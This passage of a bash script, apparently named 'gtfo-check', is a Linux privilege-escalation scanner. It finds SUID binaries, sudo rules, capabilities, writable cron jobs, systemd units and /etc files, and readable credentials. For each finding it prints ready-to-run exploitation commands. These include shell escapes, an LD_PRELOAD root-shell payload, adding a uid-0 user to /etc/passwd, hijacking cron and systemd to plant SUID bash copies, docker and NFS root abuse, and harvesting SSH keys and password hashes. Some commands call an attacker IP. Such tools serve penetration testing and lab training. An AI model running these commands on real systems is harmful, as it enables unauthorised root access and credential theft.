    torsocks) echo 'torsocks /bin/sh' ;;
    troff) echo 'troff /path/to/input-file' ;;
    tsc) echo 'tsc /path/to/input-file.ts' ;;
    ul) echo 'ul /path/to/input-file' ;;
    unexpand) echo 'unexpand -t999 /path/to/input-file' ;;
    uniq) echo 'uniq /path/to/input-file' ;;
    unshare) echo 'unshare /bin/sh' ;;
    unsquashfs) echo 'unsquashfs shell
./squashfs-root/sh -p' ;;
    unzip) echo 'unzip -K shell.zip
./sh -p' ;;
    update-alternatives) echo 'echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0' ;;
    urlget) echo 'urlget - /path/to/input-file' ;;
    uuencode) echo 'uuencode /path/to/input-file /dev/stdout | uudecode' ;;
    uv) echo 'uv run /bin/sh' ;;
    valgrind) echo 'valgrind /bin/sh' ;;
    varnishncsa) echo 'varnishncsa -g request -q '\''ReqURL ~ "/xxxxxxxxxx"'\'' -F '\''%{yyy}i'\'' -w /path/to/output-file' ;;
    vi) echo 'vi -c '\'':!/bin/sh'\'' /dev/null' ;;
    vigr) echo 'vigr' ;;
    vim) echo 'vim -c '\'':redir! >/path/to/output-file | echo "DATA" | redir END | q'\''' ;;
    vipw) echo 'vipw' ;;
    virsh) echo 'cat >/path/to/temp-file.xml <<EOF
<domain type='\''kvm'\''>
  <name>x</name>
  <os>
    <type arch='\''x86_64'\''>hvm</type>
  </os>
  <memory unit='\''KiB'\''>1</memory>
  <devices>
    <interface type='\''ethernet'\''>
      <script path='\''/path/to/command'\''/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x' ;;
    w3m) echo 'w3m -dump /path/to/input-file' ;;
    wall) echo 'wall --nobanner /path/to/input-file' ;;
    watch) echo 'watch -x /bin/sh -c '\''reset; exec /bin/sh 1>&0 2>&0'\''' ;;
    wc) echo 'wc --files0-from /path/to/input-file' ;;
    wg-quick) echo 'cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf' ;;
    wget) echo 'echo -e '\''#!/bin/sh\\n/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0' ;;
    whiptail) echo 'whiptail --textbox --scrolltext /path/to/input-file 0 0' ;;
    whois) echo 'whois -h attacker.com -p 12345 x' ;;
    wish) echo 'wish' ;;
    xargs) echo 'xargs -a /dev/null /bin/sh' ;;
    xdg-user-dir) echo 'xdg-user-dir '\''}; /bin/sh #'\''' ;;
    xdotool) echo 'xdotool exec --sync /bin/sh' ;;
    xmodmap) echo 'xmodmap -v /path/to/input-file' ;;
    xmore) echo 'xmore /path/to/input-file' ;;
    xpad) echo 'xpad -f /path/to/input-file' ;;
    xxd) echo 'xxd /path/to/input-file | xxd -r' ;;
    xz) echo 'xz -c /path/to/input-file | xz -d' ;;
    yarn) echo 'yarn exec /bin/sh' ;;
    yash) echo 'yash' ;;
    yelp) echo 'yelp man:/path/to/input-file' ;;
    yt-dlp) echo 'yt-dlp '\''https://www.youtube.com/watch?v=xxxxxxxxxxx'\'' --exec '\''/bin/sh #'\''' ;;
    yum) echo 'yum localinstall -y x-1.0-1.noarch.rpm' ;;
    zathura) echo 'zathura
:! /bin/sh -c '\''exec /bin/sh 0<&1'\''' ;;
    zcat) echo 'zcat -f /path/to/input-file' ;;
    zgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    zic) echo 'echo '\''Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -'\'' >/path/to/temp-file
echo '\''Zone Test 2:00 Jordan CE%sT'\'' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file' ;;
    zip) echo 'zip /path/to/temp-file /etc/hosts -T -TT '\''/bin/sh #'\''' ;;
    zless) echo 'zless /path/to/input-file' ;;
    zsh) echo 'zsh' ;;
    zsoelim) echo 'zsoelim /path/to/input-file' ;;
    zypper) echo 'cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x' ;;
  esac
}


# ========== SCAN ==========
LHOST="${LHOST:-10.10.14.1}"
VERBOSE=0

for arg in "$@"; do
    case "$arg" in
        -v|--verbose) VERBOSE=1 ;;
        --no-color)   RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; NC='' ;;
        -h|--help)
            cat <<'USAGE'
gtfo-check — Linux privilege escalation scanner

Usage: gtfo-check.sh [options]

  -v, --verbose   Also print recon context (kernel, mounts, root procs, all caps)
      --no-color  Disable ANSI colors (for piping to a file)
  -h, --help      Show this help

Environment:
  LHOST=10.10.14.1   Attacker IP substituted into reverse-shell / upload commands

Output: findings ranked CRITICAL -> HIGH -> MEDIUM -> INFO, followed by a
plain copy-paste block containing only the commands.
USAGE
            exit 0 ;;
    esac
done

ME=$(id -un 2>/dev/null || whoami 2>/dev/null)
MY_GROUPS=$(id -Gn 2>/dev/null)
MY_UID=$(id -u 2>/dev/null)

# Running as root: every writable-path check trivially matches and buries the
# output in noise. Report only what is useful for looting/pivoting instead.
IS_ROOT=0
[ "$MY_UID" = "0" ] && IS_ROOT=1

FINDINGS=$(mktemp "${TMPDIR:-/tmp}/gtfo.XXXXXX") || exit 1
trap 'rm -f "$FINDINGS"' EXIT INT TERM

# ---------- finding store (temp file: survives subshells/pipes) ----------
_b64() { printf '%s' "$1" | base64 2>/dev/null | tr -d '\n'; }
_unb64() { printf '%s' "$1" | base64 -d 2>/dev/null || printf '%s' "$1" | base64 -D 2>/dev/null; }

# add_finding SEV "title" "detail" "commands"
add_finding() {
    local sev="$1" n
    case "$sev" in
        CRIT) n=0 ;;
        HIGH) n=1 ;;
        MED)  n=2 ;;
        *)    n=3; sev=INFO ;;
    esac
    printf '%s|%s|%s|%s|%s\n' \
        "$n" "$sev" "$(_b64 "$2")" "$(_b64 "$3")" "$(_b64 "$4")" >> "$FINDINGS"
}

# Severity from GTFOBins function list
sev_for_funcs() {
    case "$1" in
        *shell*|*privilege-escalation*|*library-load*) echo CRIT ;;
        *file-write*|*file-read*)                     echo HIGH ;;
        *)                                            echo MED  ;;
    esac
}

# Turn GTFOBins placeholders into runnable commands.
# The lookup tables are written for `echo -e`, so backslashes are doubled
# (\\; \\n \\immediate). Unescape once here so both the report and the
# copy-paste block emit the real command text.
realize() {
    local c
    c=$(printf '%b' "$1")
    c=${c//\/path\/to\/input-file/\/etc\/shadow}
    c=${c//\/path\/to\/file-input/\/etc\/shadow}
    c=${c//\/path\/to\/input/\/etc\/shadow}
    c=${c//\/path\/to\/output-file/\/tmp\/out}
    c=${c//\/path\/to\/output-dir\//\/tmp\/}
    c=${c//\/path\/to\/output-dir/\/tmp}
    c=${c//\/path\/to\/temp-dir\//\/tmp\/}
    c=${c//\/path\/to\/temp-dir/\/tmp}
    c=${c//\/path\/to\/temp-file/\/tmp\/x}
    c=${c//\/path\/to\/CMakeLists.txt/\/tmp\/CMakeLists.txt}
    c=${c//\/path\/to\/wordlist/\/tmp\/wordlist}
    c=${c//\/path\/to\/hash/\/tmp\/hash}
    c=${c//\/path\/to\/command/\/tmp\/payload.sh}
    c=${c//\/path\/to\/lib.so/\/tmp\/evil.so}
    c=${c//\/path\/to\/script.rb/\/tmp\/x.rb}
    c=${c//\/path\/to\/script.pl/\/tmp\/x.pl}
    c=${c//\/path\/to\/ld.so/\/lib64\/ld-linux-x86-64.so.2}
    c=${c//\/path\/to\/dir\//\/tmp\/}
    c=${c//\/path\/to\//\/tmp\/}
    c=${c//attacker.com/$LHOST}
    printf '%s' "$c"
}

# Default SUID/SGID binaries: present on every distro, not privesc by themselves
is_default_setuid() {
    case "$1" in
        su|sudo|sudoedit|mount|umount|passwd|chsh|chfn|newgrp|gpasswd|chage|expiry\
        |pkexec|polkit-agent-helper-1|dbus-daemon-launch-helper|fusermount|fusermount3\
        |ping|ping6|traceroute6.iputils|mount.nfs|mount.cifs|ntfs-3g|snap-confine\
        |unix_chkpwd|pam_timestamp_check|utempter|libexec|ssh-keysign|wall|write\
        |bsd-write|dotlockfile|crontab|mlocate|locate|postdrop|postqueue|mailq\
        |sendmail|Xorg.wrap|vmware-user-suid-wrapper|dmcrypt-get-device|exim4) return 0 ;;
    esac
    return 1
}

header() {
    echo ""
    echo -e "${BOLD}${CYAN}━━━ $1 ${NC}"
}

# cap_list MAX <<< "lines"  — truncate a detail list so it never floods the report
cap_list() {
    local max="$1" input n
    input=$(cat)
    n=$(printf '%s\n' "$input" | grep -c .)
    printf '%s\n' "$input" | head -n "$max" | sed 's/^/  /'
    [ "$n" -gt "$max" ] && printf '  ... and %s more\n' "$((n - max))"
}

# --- Cache heavy scans (each runs ONCE with timeout) ---
SUID_CACHE=$(timeout 30 find / -perm -4000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)
SGID_CACHE=$(timeout 30 find / -perm -2000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)

# =============================== SUID ===============================
while IFS= read -r entry; do
    [ -z "$entry" ] && continue
    file=$(echo "$entry" | awk '{print $NF}')
    owner=$(echo "$entry" | awk '{print $3}')
    b=$(basename "$file")
    is_default_setuid "$b" && continue
    funcs=$(is_suid_exploitable "$b") || continue
    cmd=$(realize "$(get_suid_exploit "$b")")
    add_finding "$(sev_for_funcs "$funcs")" \
        "SUID $b -> runs as $owner" \
        "$file  ($funcs)" \
        "$cmd"
done <<< "$SUID_CACHE"

# SUID owned by a non-root user = lateral movement, grouped into one finding
SUID_LATERAL=$(echo "$SUID_CACHE" | awk -v me="$ME" '$3!="root" && $3!=me && NF>0 {print "  "$3":"$4"  "$NF}')
if [ -n "$SUID_LATERAL" ]; then
    add_finding MED "SUID binaries owned by other users (lateral movement)" \
        "$(printf '%s' "$SUID_LATERAL" | sed 's/^  //' | cap_list 10)" ""
fi

# =============================== SGID ===============================
while IFS= read -r entry; do
    [ -z "$entry" ] && continue
    file=$(echo "$entry" | awk '{print $NF}')
    group=$(echo "$entry" | awk '{print $4}')
    b=$(basename "$file")
    is_default_setuid "$b" && continue
    funcs=$(is_suid_exploitable "$b") || continue
    cmd=$(realize "$(get_suid_exploit "$b")")
    add_finding "$(sev_for_funcs "$funcs")" \
        "SGID $b -> runs as group $group" \
        "$file  ($funcs)" \
        "$cmd"
done <<< "$SGID_CACHE"

# =========================== CAPABILITIES ===========================
CAP_OUTPUT=""
if command -v getcap &>/dev/null; then
    CAP_OUTPUT=$(timeout 20 getcap -r / 2>/dev/null | grep -v '/snap/')
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        file=$(echo "$line" | awk '{print $1}')
        caps=$(echo "$line" | sed 's/^.* = //')
        b=$(basename "$file")
        funcs=$(is_cap_exploitable "$b") || continue
        cmd=$(realize "$(get_cap_exploit "$b")")
        add_finding CRIT "CAP $b has $caps" "$file" "$cmd"
    done <<< "$CAP_OUTPUT"

    # cap_setuid / cap_dac_read_search on anything = root, even without a GTFOBins entry
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        file=$(echo "$line" | awk '{print $1}')
        caps=$(echo "$line" | sed 's/^.* = //')
        b=$(basename "$file")
        is_cap_exploitable "$b" >/dev/null && continue
        case "$caps" in
            *cap_setuid*|*cap_dac_read_search*|*cap_dac_override*|*cap_sys_admin*|*cap_sys_ptrace*)
                add_finding HIGH "CAP $b has $caps (no GTFOBins recipe)" \
                    "$file" "# Dangerous capability — check how $b uses it" ;;
        esac
    done <<< "$CAP_OUTPUT"
fi

# =============================== SUDO ===============================
SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
[ -z "$SUDO_OUTPUT" ] && SUDO_OUTPUT=$(echo "" | sudo -S -l 2>/dev/null)

if echo "$SUDO_OUTPUT" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL'; then
    add_finding CRIT "sudo: full ALL=(ALL) ALL access" \
        "$(echo "$SUDO_OUTPUT" | grep -E '\(ALL' | head -3)" \
        "sudo su -"
fi

echo "$SUDO_OUTPUT" | grep -E '^\s+\(' | while IFS= read -r line; do
    [ -z "$line" ] && continue
    echo "$line" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL\s*$' && continue
    runas=$(echo "$line" | sed -n 's/^[[:space:]]*(\([^)]*\)).*/\1/p')
    nopass=""
    echo "$line" | grep -q 'NOPASSWD' && nopass=" [NOPASSWD]"
    # every absolute path on the rule line can be a separate allowed binary
    for bin_path in $(echo "$line" | tr ',' ' ' | tr -s ' ' '\n' | grep '^/'); do
        b=$(basename "$bin_path")
        funcs=$(is_sudo_exploitable "$b") || continue
        cmd="sudo $(realize "$(get_sudo_exploit "$b")")"
        [ -n "$runas" ] && [ "$runas" != "root" ] && cmd="sudo -u ${runas%%:*} $(realize "$(get_sudo_exploit "$b")")"
        add_finding "$(sev_for_funcs "$funcs")" \
            "sudo $b as ${runas:-root}$nopass" \
            "$bin_path  ($funcs)" \
            "$cmd"
    done
done

# sudo env_keep LD_PRELOAD = root
if echo "$SUDO_OUTPUT" | grep -qi 'env_keep.*LD_PRELOAD\|env_keep.*LD_LIBRARY_PATH'; then
    add_finding CRIT "sudo preserves LD_PRELOAD / LD_LIBRARY_PATH" \
        "Library injection into any sudo-allowed binary" \
        "cat >/tmp/pe.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <any-allowed-binary>"
fi

# readable sudoers
if [ -r /etc/sudoers ]; then
    add_finding INFO "/etc/sudoers is readable" \
        "$(grep -vE '^\s*#|^\s*$' /etc/sudoers 2>/dev/null | head -10)" \
        "cat /etc/sudoers"
fi

# ========================= PASSWD / SHADOW =========================
if [ "$IS_ROOT" -eq 0 ]; then
[ -w /etc/passwd ] && add_finding CRIT "/etc/passwd is WRITABLE" \
    "Append a uid-0 user with a known password" \
    "openssl passwd -1 -salt x pwned
# paste the hash below:
echo 'pwned:\$1\$x\$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned   # password: pwned"

[ -r /etc/shadow ] && add_finding CRIT "/etc/shadow is READABLE" \
    "Crack hashes offline" \
    "cat /etc/shadow
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed"

[ -w /etc/shadow ] && add_finding CRIT "/etc/shadow is WRITABLE" \
    "Overwrite root's hash directly" \
    "openssl passwd -6 -salt x pwned
# replace root's 2nd field in /etc/shadow with that hash, then:
su root   # password: pwned"
fi

EMPTY_PW=$(awk -F: '($2 == "") {print $1}' /etc/passwd 2>/dev/null)
[ -n "$EMPTY_PW" ] && add_finding CRIT "Users with an empty password" "$EMPTY_PW" \
    "su - $(echo "$EMPTY_PW" | head -1)"

HASH_IN_PASSWD=$(awk -F: '($2 != "x" && $2 != "*" && $2 != "!" && $2 != "!!" && $2 != "") {print $1 ":" $2}' /etc/passwd 2>/dev/null)
[ -n "$HASH_IN_PASSWD" ] && add_finding HIGH "Password hashes stored in /etc/passwd" "$HASH_IN_PASSWD" \
    "echo '$(echo "$HASH_IN_PASSWD" | head -1)' > /tmp/h
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/h"

# ======================= GROUP MEMBERSHIPS =========================
for grp in docker lxd lxc disk shadow adm video sudo wheel; do
    echo "$MY_GROUPS" | grep -qw "$grp" || continue
    case "$grp" in
        docker) add_finding CRIT "Member of group 'docker' = root" \
            "The docker socket mounts the host filesystem" \
            "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh" ;;
        lxd|lxc) add_finding CRIT "Member of group '$grp' = root" \
            "Privileged container with the host disk mounted" \
            "lxc init ubuntu:18.04 pwn -c security.privileged=true
lxc config device add pwn host disk source=/ path=/mnt/root recursive=true
lxc start pwn
lxc exec pwn /bin/sh
# then: chroot /mnt/root" ;;
        disk) add_finding CRIT "Member of group 'disk' = root" \
            "Raw block-device access bypasses file permissions" \
            "df -h /    # find the device, e.g. /dev/sda1
debugfs /dev/sda1
# at the debugfs prompt:  cat /etc/shadow" ;;
        shadow) add_finding HIGH "Member of group 'shadow'" \
            "Read password hashes" \
            "cat /etc/shadow
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed" ;;
        adm) add_finding MED "Member of group 'adm'" \
            "Read system logs — harvest credentials" \
            "grep -rniE 'passw|secret|token|api[_-]?key' /var/log/ 2>/dev/null | head -40" ;;
        video) add_finding MED "Member of group 'video'" \
            "Capture the console framebuffer" \
            "cat /dev/fb0 > /tmp/screen.raw
# width x height:
cat /sys/class/graphics/fb0/virtual_size" ;;
        sudo|wheel) add_finding INFO "Member of group '$grp'" \
            "Password-based sudo likely available" \
            "sudo -l" ;;
    esac
done

# ===================== WRITABLE CRON / SYSTEMD =====================
CRON_W=""
if [ "$IS_ROOT" -eq 0 ]; then
    for crontab_file in /etc/crontab /etc/cron.d/*; do
        [ -r "$crontab_file" ] || continue
        while IFS= read -r line; do
            for script_path in $(echo "$line" | tr ' \t' '\n' | grep '^/'); do
                [ -w "$script_path" ] 2>/dev/null || continue
                CRON_W="${CRON_W}${script_path}
"
            done
        done < <(grep -vE '^\s*#|^\s*$' "$crontab_file" 2>/dev/null)
    done
    for crondir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        [ -d "$crondir" ] || continue
        for script in "$crondir"/*; do
            [ -f "$script" ] && [ -w "$script" ] || continue
            CRON_W="${CRON_W}${script}
"
        done
    done
fi
CRON_W=$(printf '%s' "$CRON_W" | grep -v '^$' | sort -u)
if [ -n "$CRON_W" ]; then
    TARGET=$(echo "$CRON_W" | head -1)
    add_finding CRIT "Writable script executed by cron (as root)" \
        "$(echo "$CRON_W" | cap_list 8)" \
        "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $TARGET
# wait for the cron interval to fire, then:
/tmp/rootbash -p"
fi

CRON_OTHER=""
for cronbase in /var/spool/cron/crontabs /var/spool/cron; do
    [ -d "$cronbase" ] || continue
    for uc in "$cronbase"/*; do
        [ -f "$uc" ] && [ -r "$uc" ] || continue
        [ "$(basename "$uc")" = "$ME" ] && continue
        CRON_OTHER="${CRON_OTHER}  $uc:
$(grep -vE '^\s*#|^\s*$' "$uc" 2>/dev/null | sed 's/^/    /')
"
    done
done
[ -n "$CRON_OTHER" ] && add_finding MED "Readable crontabs of other users" "$CRON_OTHER" ""

SVC_W=""
if [ "$IS_ROOT" -eq 0 ]; then
    for svcdir in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system /run/systemd/system; do
        [ -d "$svcdir" ] || continue
        while IFS= read -r svc; do
            [ -n "$svc" ] && [ -w "$svc" ] || continue
            SVC_W="${SVC_W}${svc}
"
        done < <(find "$svcdir" -maxdepth 1 -name '*.service' -type f 2>/dev/null)
    done
fi
SVC_W=$(printf '%s' "$SVC_W" | grep -v '^$' | sort -u)
if [ -n "$SVC_W" ]; then
    SVC_N=$(echo "$SVC_W" | wc -l | tr -d ' ')
    TARGET=$(echo "$SVC_W" | head -1)
    add_finding CRIT "Writable systemd unit file ($SVC_N found)" \
        "$(echo "$SVC_W" | head -8 | sed 's/^/  /')$([ "$SVC_N" -gt 8 ] && printf '\n  ... and %s more' "$((SVC_N-8))")" \
        "sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\"|' $TARGET
sudo systemctl daemon-reload
sudo systemctl restart $(basename "$TARGET" .service)
/tmp/rootbash -p"
fi

# ===================== WRITABLE PATH / LD / ETC ====================
if [ "$IS_ROOT" -eq 0 ]; then
IFS=':' read -ra PDIRS <<< "$PATH"
for dir in "${PDIRS[@]}"; do
    [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ] || continue
    add_finding HIGH "Writable PATH directory: $dir" \
        "Hijack any unqualified command run by root (cron, services)" \
        "printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > $dir/<CMD>
chmod +x $dir/<CMD>
# once root runs <CMD>:
/tmp/rootbash -p"
done

if [ -w /etc/ld.so.preload ] 2>/dev/null; then
    add_finding CRIT "/etc/ld.so.preload is writable" "Global library preload = root on next command" \
        "cat >/tmp/pe.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
echo /tmp/pe.so > /etc/ld.so.preload"
elif [ ! -e /etc/ld.so.preload ] && [ -w /etc ] 2>/dev/null; then
    add_finding CRIT "/etc is writable — can create /etc/ld.so.preload" "Global library preload" \
        "echo /tmp/pe.so > /etc/ld.so.preload"
fi

if [ -r /etc/ld.so.conf ]; then
    while IFS= read -r libdir; do
        case "$libdir" in ''|'#'*|include*) continue ;; esac
        [ -d "$libdir" ] && [ -w "$libdir" ] || continue
        add_finding HIGH "Writable library path: $libdir" "Listed in /etc/ld.so.conf" \
            "# Drop a malicious .so here, then: ldconfig"
    done < /etc/ld.so.conf
fi

ETC_W=""
for etcfile in /etc/sudoers /etc/crontab /etc/ssh/sshd_config /etc/ld.so.conf \
    /etc/environment /etc/profile /etc/bash.bashrc /etc/pam.d/common-auth /etc/pam.d/su \
    /etc/fstab /etc/exports /etc/anacrontab /etc/logrotate.conf /etc/rsyslog.conf; do
    [ -w "$etcfile" ] 2>/dev/null || continue
    case "$etcfile" in
        /etc/sudoers) add_finding CRIT "/etc/sudoers is writable" "" \
            "echo '$ME ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo su -" ;;
        /etc/crontab) add_finding CRIT "/etc/crontab is writable" "" \
            "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab
# wait a minute, then:
/tmp/rootbash -p" ;;
        *) ETC_W="${ETC_W}  ${etcfile}
" ;;
    esac
done
[ -n "$ETC_W" ] && add_finding HIGH "Other writable /etc config files" "$ETC_W" \
    "# Review what root reads from these"
fi

# =============================== NFS ===============================
if [ -r /etc/exports ] && grep -q "no_root_squash" /etc/exports 2>/dev/null; then
    SHARE=$(grep "no_root_squash" /etc/exports | grep -v '^\s*#' | awk '{print $1}' | head -1)
    add_finding CRIT "NFS export with no_root_squash: $SHARE" \
        "$(grep 'no_root_squash' /etc/exports | grep -v '^\s*#')" \
        "# ---- on YOUR attacking box, as root ----
mkdir -p /mnt/nfs
mount -o rw,vers=3 $(hostname -I 2>/dev/null | awk '{print $1}'):$SHARE /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# ---- back on the target ----
$SHARE/rootbash -p"
fi

# ======================== WRITABLE FILES ===========================
if [ "$IS_ROOT" -eq 0 ]; then
    WRITABLE_CACHE=$(timeout 30 find /etc /opt /var /usr/local /srv /root -writable -type f ! -user "$ME" \
        ! -path "/var/lib/*" ! -path "/var/cache/*" ! -path "/var/log/*" ! -path "/var/tmp/*" \
        2>/dev/null | head -25)
    [ -n "$WRITABLE_CACHE" ] && add_finding HIGH "Writable files owned by other users" \
        "$(echo "$WRITABLE_CACHE" | cap_list 10)" ""
fi

# ========================= CREDENTIALS =============================
CRED_RE='(password|passwd|pwd|secret|token|api[_-]?key|db_pass(word)?)[[:space:]]*[=:][[:space:]]*[^[:space:]#]'
NOISE_RE='^[[:space:]]*(#|//|\*|;|--)|example|changeme|placeholder|your_|xxxx|\$\{|<%=|REPLACE'

for cf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" \
    "$HOME/.psql_history" "$HOME/.my.cnf" "/etc/shadow.bak" "/etc/passwd.bak" \
    "/etc/openvpn/auth.txt" "/etc/ppp/chap-secrets" "/etc/ppp/pap-secrets"; do
    [ -r "$cf" ] && [ -f "$cf" ] && [ -s "$cf" ] || continue
    HITS=$(grep -inE "$CRED_RE" "$cf" 2>/dev/null | grep -vEi "$NOISE_RE" | head -5)
    if [ -n "$HITS" ]; then
        add_finding HIGH "Credentials in $cf" "$(echo "$HITS" | sed 's/^/  /')" "cat $cf"
    else
        add_finding INFO "Readable history/secret file: $cf" "" "cat $cf"
    fi
done

for keydir in /home/*/.ssh /root/.ssh; do
    [ -d "$keydir" ] || continue
    for keyfile in "$keydir"/id_* "$keydir"/*key*; do
        [ -f "$keyfile" ] && [ -r "$keyfile" ] || continue
        case "$keyfile" in *.pub) continue ;; esac
        kuser=$(echo "$keyfile" | awk -F/ '{print $3}')
        [ "$kuser" = ".ssh" ] && kuser=root
        add_finding CRIT "Readable SSH private key: $keyfile" \
            "Owner: $(stat -c '%U:%G' "$keyfile" 2>/dev/null)" \
            "cp $keyfile /tmp/k && chmod 600 /tmp/k
ssh -i /tmp/k $kuser@127.0.0.1"
    done
done

# config files with real credential values
while IFS= read -r envfile; do
    [ -n "$envfile" ] || continue
    HITS=$(grep -inE "$CRED_RE" "$envfile" 2>/dev/null | grep -vEi "$NOISE_RE" | head -4)
    [ -n "$HITS" ] || continue
    add_finding HIGH "Credentials in $envfile" "$(echo "$HITS" | sed 's/^/  /')" \
        "cat $envfile"
done < <(find /var/www /opt /srv /home /etc -maxdepth 4 \( \
    -name '.env' -o -name 'wp-config.php' -o -name 'configuration.php' \
    -o -name 'config.php' -o -name 'db.php' -o -name 'database.yml' \
    -o -name 'settings.py' -o -name 'appsettings.json' -o -name 'application.properties' \
    -o -name '*.cfg' -o -name '*.ini' \) -readable -type f 2>/dev/null | head -60)

if [ -r /var/lib/cloud/instance/user-data.txt ] && [ -s /var/lib/cloud/instance/user-data.txt ]; then
    add_finding HIGH "Cloud-init user-data is readable" \
        "$(grep -inE "$CRED_RE" /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -5 | sed 's/^/  /')" \
        "cat /var/lib/cloud/instance/user-data.txt"
fi

# ====================== BACKUPS / INTERESTING ======================
BACKUPS=$(timeout 20 find /opt /srv /tmp /var/backups /backup /backups /home -maxdepth 4 \
    -type f -size +0c \( -name "*.zip" -o -name "*.tar*" -o -name "*.gz" -o -name "*.bz2" \
    -o -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.sql" \
    -o -name "*.db" -o -name "*.sqlite" -o -name "*.kdbx" \) -readable 2>/dev/null | head -20)
if [ -n "$BACKUPS" ]; then
    DETAIL=""
    while IFS= read -r bf; do
        [ -n "$bf" ] || continue
        DETAIL="${DETAIL}  $bf  [$(ls -lh "$bf" 2>/dev/null | awk '{print $5}')]  $(file -b "$bf" 2>/dev/null | cut -c1-45)
"
    done <<< "$BACKUPS"
    FIRST=$(echo "$BACKUPS" | head -1)
    add_finding MED "Readable backup files / archives" \
        "$(printf '%s' "$DETAIL" | sed 's/^  //' | cap_list 10)" \
        "mkdir -p /tmp/ex && cd /tmp/ex
# pick the right one:
tar xf $FIRST    # or: unzip $FIRST
grep -rniE 'passw|secret|token' /tmp/ex | head -20"
fi

OTHER_HOME=$(timeout 15 find /home -readable -not -user "$ME" -type f \
    -not -path "*/snap/*" -not -path "*/.cache/*" -not -path "*/.local/*" \
    -not -path "*/.git/*" -not -path "*/node_modules/*" -not -name "*.sample" \
    2>/dev/null | head -20)
[ -n "$OTHER_HOME" ] && add_finding MED "Readable files in other users' home dirs" \
    "$(echo "$OTHER_HOME" | cap_list 10)" ""

OPT_DIRS=""
for ndd in /opt /srv; do
    [ -d "$ndd" ] || continue
    for subdir in "$ndd"/*/; do
        [ -d "$subdir" ] || continue
        [ -n "$(ls -A "$subdir" 2>/dev/null)" ] || continue
        OPT_DIRS="${OPT_DIRS}  ${subdir%/}  ($(ls -ld "$subdir" 2>/dev/null | awk '{print $1, $3":"$4}'))
"
    done
done
[ -n "$OPT_DIRS" ] && add_finding INFO "Non-default directories in /opt, /srv" \
    "$(printf '%s' "$OPT_DIRS" | sed 's/^  //' | cap_list 8)" \
    "ls -la /opt /srv 2>/dev/null"

# ======================= INTERNAL SERVICES =========================
if command -v ss &>/dev/null; then
    LOCAL_PORTS=$(ss -tlnH 2>/dev/null | awk '{print $4}' \
        | grep -E '^(127\.0\.0\.1|\[::1\]|localhost)' | sed 's/.*://' | sort -un)
    for port in $LOCAL_PORTS; do
        [ -n "$port" ] || continue
        case "$port" in
            3306) add_finding MED "MySQL on 127.0.0.1:3306 (internal only)" \
                "Often root/no password on lab boxes" \
                "mysql -u root -h 127.0.0.1 -P 3306
# if that works:
mysql -u root -h 127.0.0.1 -e 'select user,host,authentication_string from mysql.user;'" ;;
            5432) add_finding MED "PostgreSQL on 127.0.0.1:5432 (internal only)" "" \
                "psql -h 127.0.0.1 -U postgres
# then:  \\! /bin/sh" ;;
            6379) add_finding HIGH "Redis on 127.0.0.1:6379 (internal only)" \
                "Usually unauthenticated — can write files as the redis user" \
                "redis-cli -h 127.0.0.1
INFO
CONFIG GET dir" ;;
            27017) add_finding MED "MongoDB on 127.0.0.1:27017 (internal only)" "" \
                "mongo 127.0.0.1:27017
show dbs" ;;
            11211) add_finding MED "Memcached on 127.0.0.1:11211 (internal only)" "" \
                "printf 'stats\r\n' | nc 127.0.0.1 11211" ;;
            9200) add_finding MED "Elasticsearch on 127.0.0.1:9200 (internal only)" "" \
                "curl -s http://127.0.0.1:9200/_cat/indices" ;;
            8080|8443|8000|8888|5000|3000) add_finding MED "HTTP service on 127.0.0.1:$port (internal only)" \
                "Not reachable externally — pivot through it" \
                "curl -si http://127.0.0.1:$port/ | head -30
